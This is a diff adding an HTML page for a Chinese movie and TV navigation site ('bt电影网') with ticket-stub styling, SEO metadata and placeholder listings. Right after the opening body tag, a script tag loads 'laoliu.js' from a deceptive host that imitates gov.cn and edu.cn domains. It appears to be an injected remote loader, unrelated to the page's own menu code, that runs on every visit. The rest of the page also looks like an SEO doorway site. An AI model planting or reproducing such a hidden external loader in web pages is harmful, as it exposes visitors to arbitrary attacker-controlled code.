@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>bt电影网 - 高清电影/热播剧/综艺动漫放映导航 | btdianyingwang-h5</title>
+<meta name="description" content="bt电影网（btdianyingwang-h5）用放映厅票根方式整理高清电影、热播电视剧、综艺动漫与影评。移动端自适应，https://btdianyingwang-h5.github.io。" />
+<meta name="keywords" content="bt电影网,btdianyingwang-h5,高清电影,热播电视剧,综艺动漫,影视影评,电影导航" />
+<link rel="canonical" href="https://btdianyingwang-h5.github.io/" />
+<meta property="og:title" content="bt电影网 - 放映厅式影视导航" />
+<meta property="og:description" content="bt电影网用票根/排片表方式聚合电影、剧集、综艺动漫与影评，单文件自适应站点。" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://btdianyingwang-h5.github.io/" />
+<meta name="twitter:card" content="summary_large_image" />
+<style>
+:root{
+  --bg:#0c0d0a;
+  --panel:#14160f;
+  --panel2:#1b1e14;
+  --line:#3a3d28;
+  --yellow:#f5e03b;
+  --green:#7cf25b;
+  --dim:#9aa085;
+  --text:#f3f4e7;
+  --ticket:#20231a;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  background:
+    repeating-linear-gradient(90deg,rgba(245,224,59,.04) 0 2px,transparent 2px 22px),
+    radial-gradient(800px 380px at 85% -10%,rgba(124,242,91,.10),transparent 60%),
+    var(--bg);
+  color:var(--text);
+  font-family:"PingFang SC","Microsoft YaHei",ui-sans-serif,system-ui,sans-serif;
+  line-height:1.7;font-size:16px;-webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 18px}
+.mono{font-family:ui-monospace,"SFMono-Regular",Consolas,Menlo,monospace}
+
+/* Ticket board header */
+.ticketboard{position:sticky;top:0;z-index:50;background:rgba(12,13,10,.92);backdrop-filter:blur(8px);border-bottom:2px solid var(--yellow)}
+.board-in{display:flex;align-items:center;justify-content:space-between;height:64px;gap:12px}
+.brand{display:flex;align-items:center;gap:12px;font-weight:900}
+.brand .reel{width:36px;height:36px;border-radius:50%;border:3px dashed var(--yellow);display:grid;place-items:center;font-size:16px;color:var(--yellow);animation:spin 6s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.brand b{font-size:19px;letter-spacing:1px}
+.brand b em{font-style:normal;color:var(--yellow)}
+.board-nav{display:flex;gap:6px;flex-wrap:wrap}
+.board-nav a{font-size:13px;padding:8px 12px;border:1px solid var(--line);border-radius:999px;color:var(--dim)}
+.board-nav a:hover{color:var(--bg);background:var(--yellow);border-color:var(--yellow)}
+.menu-btn{display:none;background:var(--panel2);border:1px solid var(--yellow);color:var(--yellow);width:42px;height:42px;border-radius:10px;font-size:20px;cursor:pointer}
+
+/* Lobby hero */
+.lobby{padding:70px 0 40px;border-bottom:1px dashed var(--line)}
+.lobby .now-showing{font-family:ui-monospace,monospace;font-size:12px;letter-spacing:4px;color:var(--green);text-transform:uppercase}
+.lobby h1{font-size:clamp(34px,6vw,60px);line-height:1.02;font-weight:900;margin:14px 0;letter-spacing:-1px}
+.lobby h1 em{font-style:normal;color:var(--yellow)}
+.lobby p{color:var(--dim);max-width:620px;margin-bottom:26px}
+.lobby-cta{display:flex;gap:12px;flex-wrap:wrap}
+.btn{padding:11px 18px;border-radius:10px;font-weight:800;font-size:14px;border:0;cursor:pointer;background:var(--yellow);color:#0c0d0a}
+.btn.ghost{background:transparent;border:1px solid var(--yellow);color:var(--yellow)}
+.marquee{margin-top:30px;overflow:hidden;white-space:nowrap;border-top:1px dashed var(--line);border-bottom:1px dashed var(--line);padding:10px 0}
+.marquee span{display:inline-block;padding:0 22px;color:var(--green);font-family:ui-monospace,monospace;font-size:13px}
+.marquee span::before{content:"▸ ";color:var(--yellow)}
+
+/* Section */
+.reel-section{padding:48px 0;border-bottom:1px dashed var(--line)}
+.reel-head{display:flex;align-items:baseline;gap:14px;margin-bottom:22px}
+.reel-head .sign{font-family:ui-monospace,monospace;background:var(--yellow);color:#0c0d0a;font-weight:900;padding:4px 10px;border-radius:6px;font-size:13px}
+.reel-head h2{font-size:24px;font-weight:900;letter-spacing:-.5px}
+.reel-head a{margin-left:auto;font-size:13px;color:var(--green);border-bottom:1px solid var(--green)}
+
+/* Ticket stubs */
+.stub-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:14px}
+.stub{
+  background:var(--ticket);border:1px solid var(--line);border-radius:12px;overflow:hidden;position:relative;
+  display:flex;flex-direction:column;
+}
+.stub:before{content:"";position:absolute;left:0;right:0;top:84px;height:1px;background:repeating-linear-gradient(90deg,var(--line) 0 6px,transparent 6px 12px)}
+.stub .poster{height:84px;display:grid;place-items:center;font-size:30px;background:linear-gradient(120deg,rgba(245,224,59,.16),rgba(124,242,91,.14))}
+.stub .perf{display:flex;justify-content:space-between;padding:10px 12px;font-family:ui-monospace,monospace;font-size:11px;color:var(--green)}
+.stub h3{padding:6px 12px 0;font-size:14px;font-weight:800}
+.stub .meta{padding:4px 12px 12px;font-size:12px;color:var(--dim);display:flex;gap:8px;flex-wrap:wrap}
+.stub .meta span{border:1px solid var(--line);padding:1px 7px;border-radius:999px}
+.stub .seat{position:absolute;top:8px;right:8px;background:#0c0d0a;border:1px solid var(--yellow);color:var(--yellow);font-family:ui-monospace,monospace;font-size:10px;padding:2px 6px;border-radius:6px}
+
+/* Programme rows */
+.programme{border:1px solid var(--line);border-radius:12px;overflow:hidden}
+.prow{display:grid;grid-template-columns:90px 1fr auto;gap:14px;align-items:center;padding:14px 16px;border-bottom:1px dashed var(--line);background:var(--panel)}
+.prow:last-child{border-bottom:none}
+.prow .time{font-family:ui-monospace,monospace;color:var(--yellow);font-weight:800;font-size:14px}
+.prow h4{font-size:15px;font-weight:800}
+.prow p{font-size:13px;color:var(--dim)}
+.prow .hall{font-family:ui-monospace,monospace;font-size:12px;color:var(--green);white-space:nowrap}
+
+/* Variety signs */
+.signs{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border:1px solid var(--line)}
+.signs a{padding:26px 18px;text-align:center;border-right:1px solid var(--line);transition:background .2s}
+.signs a:last-child{border-right:none}
+.signs a:hover{background:var(--panel2)}
+.signs .ic{font-size:26px}
+.signs h4{font-size:15px;font-weight:800;margin:8px 0 4px}
+.signs p{font-size:12px;color:var(--dim)}
+
+/* Review subtitles */
+.subs{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.sub{border-left:3px solid var(--green);background:var(--panel);padding:16px 18px}
+.sub .time{font-family:ui-monospace,monospace;font-size:11px;color:var(--yellow);letter-spacing:1px}
+.sub h4{font-size:16px;font-weight:800;margin:6px 0}
+.sub p{font-size:13px;color:var(--dim)}
+
+/* About lobby */
+.about{display:grid;grid-template-columns:1.3fr .7fr;gap:0;border:1px solid var(--line)}
+.about .left{padding:28px;border-right:1px solid var(--line)}
+.about .left h3{font-size:22px;font-weight:900;margin-bottom:12px}
+.about .left p{color:var(--dim);margin-bottom:12px}
+.about .right{padding:28px;background:var(--panel);font-family:ui-monospace,monospace;font-size:13px;color:var(--green)}
+.about .right li{list-style:none;padding:8px 0;border-bottom:1px dashed var(--line)}
+.about .right li:before{content:"🎟 ";color:var(--yellow)}
+
+/* Footer */
+.lobby-foot{border-top:2px solid var(--yellow);padding:32px 0;background:var(--panel)}
+.foot-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:18px}
+.foot h4{font-size:13px;letter-spacing:2px;text-transform:uppercase;color:var(--yellow);margin-bottom:10px}
+.foot a{display:block;font-size:13px;color:var(--dim);padding:4px 0}
+.foot a:hover{color:var(--green)}
+.foot .url{display:inline-block;margin-top:8px;font-family:ui-monospace,monospace;font-size:12px;border:1px dashed var(--yellow);padding:6px 10px;color:var(--yellow)}
+.copy{margin-top:22px;text-align:center;font-size:12px;color:var(--dim)}
+
+.drawer{position:fixed;inset:0 0 0 auto;width:260px;background:var(--panel);border-left:2px solid var(--yellow);z-index:60;padding:22px;transform:translateX(100%);transition:transform .28s;display:flex;flex-direction:column;gap:8px}
+.drawer.open{transform:none}
+.drawer a{padding:12px;border-radius:10px;background:var(--panel2);font-size:14px}
+.drawer .x{align-self:flex-end;background:none;border:0;color:var(--yellow);font-size:24px;cursor:pointer}
+.mask{position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:55;display:none}
+.mask.show{display:block}
+
+@media(max-width:1024px){
+  .stub-grid{grid-template-columns:repeat(3,1fr)}
+  .signs{grid-template-columns:repeat(2,1fr)}
+  .signs a:nth-child(2n){border-right:none}
+  .subs{grid-template-columns:1fr}
+  .about{grid-template-columns:1fr}
+  .about .left{border-right:none;border-bottom:1px solid var(--line)}
+  .foot-grid{grid-template-columns:1fr 1fr}
+}
+@media(max-width:768px){
+  .board-nav{display:none}
+  .menu-btn{display:block}
+  .stub-grid{grid-template-columns:repeat(2,1fr)}
+  .prow{grid-template-columns:64px 1fr;grid-template-areas:"time body" "time hall"}
+  .prow .time{grid-area:time}
+  .prow .hall{grid-area:hall;padding-top:0}
+  .signs{grid-template-columns:1fr}
+  .signs a{border-right:none;border-bottom:1px solid var(--line)}
+  .foot-grid{grid-template-columns:1fr}
+}
+@media(max-width:480px){
+  .stub-grid{grid-template-columns:1fr}
+  .lobby h1{font-size:30px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="ticketboard">
+  <div class="wrap board-in">
+    <div class="brand"><span class="reel">🎞</span><b>bt<em>电影网</em></b></div>
+    <nav class="board-nav" id="nav">
+      <a href="#lobby">大厅</a>
+      <a href="#films">热映电影</a>
+      <a href="#tv">剧集排片</a>
+      <a href="#variety">综艺动漫</a>
+      <a href="#review">影评字幕</a>
+      <a href="#about">关于BT</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<main class="wrap">
+
+  <section class="lobby" id="lobby">
+    <div class="now-showing">NOW SHOWING · 2026 秋片单</div>
+    <h1>bt电影网：<em>取一张票根</em>，<br/>就知道今晚看什么</h1>
+    <p>bt电影网（btdianyingwang-h5）把高清电影、热播电视剧、综艺动漫与影评，排成影院大厅的“放映表”。手机上像看票根，桌面上像看指示牌，找片不滑到手酸。</p>
+    <div class="lobby-cta">
+      <a href="#films" class="btn">看热映片单</a>
+      <a href="#tv" class="btn ghost">看剧集排片</a>
+    </div>
+    <div class="marquee">
+      <span>星轨回音 9.2</span><span>长安灯市录 热播</span><span>山海钟鸣 国漫</span><span>晚风邮差 治愈</span><span>无声证词 悬疑</span>
+    </div>
+  </section>
+
+  <section class="reel-section" id="films">
+    <div class="reel-head"><span class="sign">A1</span><h2>热映电影 · 票根墙</h2><a href="#">全部影片 #</a></div>
+    <div class="stub-grid">
+      <article class="stub"><span class="seat">A1</span><div class="poster">🎥</div><div class="perf"><span>科幻</span><span>9.2</span></div><h3>星轨回音</h3><div class="meta"><span>2026</span><span>IMAX</span></div></article>
+      <article class="stub"><span class="seat">A2</span><div class="poster">🎭</div><div class="perf"><span>剧情</span><span>8.7</span></div><h3>晚风邮差</h3><div class="meta"><span>文艺</span><span>治愈</span></div></article>
+      <article class="stub"><span class="seat">A3</span><div class="poster">🕵️</div><div class="perf"><span>悬疑</span><span>8.9</span></div><h3>雾港信号</h3><div class="meta"><span>犯罪</span><span>烧脑</span></div></article>
+      <article class="stub"><span class="seat">A4</span><div class="poster">⚔️</div><div class="perf"><span>动作</span><span>8.4</span></div><h3>铁幕西行</h3><div class="meta"><span>战争</span><span>大片</span></div></article>
+      <article class="stub"><span class="seat">A5</span><div class="poster">💞</div><div class="perf"><span>爱情</span><span>8.6</span></div><h3>五月来信</h3><div class="meta"><span>青春</span><span>甜宠</span></div></article>
+      <article class="stub"><span class="seat">A6</span><div class="poster">👻</div><div class="perf"><span>惊悚</span><span>7.8</span></div><h3>旧巷低语</h3><div class="meta"><span>悬疑</span><span>深夜</span></div></article>
+      <article class="stub"><span class="seat">A7</span><div class="poster">🚀</div><div class="perf"><span>冒险</span><span>8.8</span></div><h3>失重海岸</h3><div class="meta"><span>太空</span><span>IMAX</span></div></article>
+      <article class="stub"><span class="seat">A8</span><div class="poster">🐉</div><div class="perf"><span>国漫</span><span>9.0</span></div><h3>山海钟鸣</h3><div class="meta"><span>神话</span><span>动画</span></div></article>
+      <article class="stub"><span class="seat">A9</span><div class="poster">🎻</div><div class="perf"><span>音乐</span><span>8.5</span></div><h3>夜曲都市</h3><div class="meta"><span>传记</span><span>文艺</span></div></article>
+      <article class="stub"><span class="seat">A10</span><div class="poster">🐺</div><div class="perf"><span>奇幻</span><span>8.3</span></div><h3>银月牧野</h3><div class="meta"><span>冒险</span><span>CG</span></div></article>
+    </div>
+  </section>
+
+  <section class="reel-section" id="tv">
+    <div class="reel-head"><span class="sign">A2</span><h2>剧集排片表</h2><a href="#">全部剧集 #</a></div>
+    <div class="programme">
+      <div class="prow"><div class="time">20:00</div><div><h4>长安灯市录</h4><p>古装权谋 · 群像戏 · 灯一亮命案来</p></div><div class="hall">1 号厅 · 26集</div></div>
+      <div class="prow"><div class="time">21:10</div><div><h4>下班别开机</h4><p>都市职场 · 打工人嘴替 · 情感拉扯</p></div><div class="hall">2 号厅 · 19集</div></div>
+      <div class="prow"><div class="time">22:00</div><div><h4>烈风前线</h4><p>军旅热血 · 不灌鸡汤 · 选择戏</p></div><div class="hall">3 号厅 · 31集</div></div>
+      <div class="prow"><div class="time">23:30</div><div><h4>无声证词</h4><p>法医悬疑 · 短剧 · 反转密</p></div><div class="hall">4 号厅 · 12集</div></div>
+    </div>
+  </section>
+
+  <section class="reel-section" id="variety">
+    <div class="reel-head"><span class="sign">A3</span><h2>综艺 · 动漫指示牌</h2><a href="#">全部分类 #</a></div>
+    <div class="signs">
+      <a href="#"><div class="ic">🎤</div><h4>热门综艺</h4><p>真人秀 / 音综 / 户外</p></a>
+      <a href="#"><div class="ic">🐉</div><h4>国漫精品</h4><p>修仙 / 神话 / 武侠</p></a>
+      <a href="#"><div class="ic">🎌</div><h4>日韩动漫</h4><p>热血 / 治愈 / 校园</p></a>
+      <a href="#"><div class="ic">🧸</div><h4>少儿动画</h4><p>启蒙 / 益智 / 合家欢</p></a>
+    </div>
+  </section>
+
+  <section class="reel-section" id="review">
+    <div class="reel-head"><span class="sign">A4</span><h2>影评字幕条</h2><a href="#">全部影评 #</a></div>
+    <div class="subs">
+      <article class="sub"><div class="time">SUB 00:42</div><h4>《星轨回音》的后劲</h4><p>它把“人类是否值得被回应”拍成私人问题，结尾那束光是给观众的信。</p></article>
+      <article class="sub"><div class="time">SUB 01:15</div><h4>《长安灯市录》群像</h4><p>反派不脸谱，女官不工具人；古装剧也能靠剧本活下来。</p></article>
+      <article class="sub"><div class="time">SUB 02:03</div><h4>《晚风邮差》的体面</h4><p>没有大事件，只有未寄出的信和中年人的克制，治愈但不腻。</p></article>
+      <article class="sub"><div class="time">SUB 03:20</div><h4>《山海钟鸣》美术</h4><p>钟声一响神兽醒，今年国漫最该夸的是色彩与线条，不是特效堆料。</p></article>
+    </div>
+  </section>
+
+  <section class="reel-section" id="about">
+    <div class="reel-head"><span class="sign">A5</span><h2>关于 bt电影网</h2></div>
+    <div class="about">
+      <div class="left">
+        <h3>不是播放器，是影迷的“放映厅大厅”</h3>
+        <p>bt电影网（btdianyingwang-h5）只做导航与片单：电影、剧集、综艺、动漫、影评，像影院大厅的排片表一样一目了然。</p>
+        <p>单文件 index.html、CSS/JS 内联、移动端自适应，适合 GitHub Pages 托管，也适合做个人影视书签站、片单站、影评站。</p>
+        <p>不提供盗版资源下载与在线盗播，所有条目仅做信息导航。</p>
+      </div>
+      <ul class="right">
+        <li>票根式片单，扫一眼就懂</li>
+        <li>排片表代替菜单瀑布</li>
+        <li>移动端先读，桌面端读爽</li>
+        <li>内链用 #，不伪造深链</li>
+        <li>必应友好：标题/描述/canonical 齐</li>
+      </ul>
+    </div>
+  </section>
+
+</main>
+
+<footer class="lobby-foot">
+  <div class="wrap">
+    <div class="foot-grid">
+      <div class="foot">
+        <h4>bt电影网</h4>
+        <p style="color:var(--dim);font-size:13px">放映厅式影视导航：电影 / 剧集 / 综艺 / 动漫 / 影评。</p>
+        <span class="url">https://btdianyingwang-h5.github.io</span>
+      </div>
+      <div class="foot"><h4>电影</h4><a href="#">热映电影 #</a><a href="#">高分经典 #</a><a href="#">科幻大片 #</a><a href="#">悬疑烧脑 #</a></div>
+      <div class="foot"><h4>剧集</h4><a href="#">古装权谋 #</a><a href="#">都市情感 #</a><a href="#">军旅热血 #</a><a href="#">悬疑短剧 #</a></div>
+      <div class="foot"><h4>站点</h4><a href="#films">热映电影 #</a><a href="#tv">剧集排片 #</a><a href="#variety">综艺动漫 #</a><a href="#review">影评字幕 #</a></div>
+    </div>
+    <div class="copy">© 2026 bt电影网 btdianyingwang-h5 · 静态放映厅导航演示，不提供盗版资源下载与在线盗播。</div>
+  </div>
+</footer>
+
+<div class="mask" id="mask"></div>
+<aside class="drawer" id="drawer">
+  <button class="x" id="drawerClose" aria-label="关闭">×</button>
+  <a href="#lobby">大厅</a>
+  <a href="#films">热映电影</a>
+  <a href="#tv">剧集排片</a>
+  <a href="#variety">综艺动漫</a>
+  <a href="#review">影评字幕</a>
+  <a href="#about">关于BT</a>
+</aside>
+
+<script>
+  var menuBtn=document.getElementById('menuBtn');
+  var drawer=document.getElementById('drawer');
+  var mask=document.getElementById('mask');
+  var close=document.getElementById('drawerClose');
+  menuBtn.addEventListener('click',function(){drawer.classList.add('open');mask.classList.add('show')});
+  close.addEventListener('click',function(){drawer.classList.remove('open');mask.classList.remove('show')});
+  mask.addEventListener('click',function(){drawer.classList.remove('open');mask.classList.remove('show')});
+  drawer.querySelectorAll('a').forEach(function(a){
+    a.addEventListener('click',function(){drawer.classList.remove('open');mask.classList.remove('show')});
+  });
+</script>
+</body>
+</html>
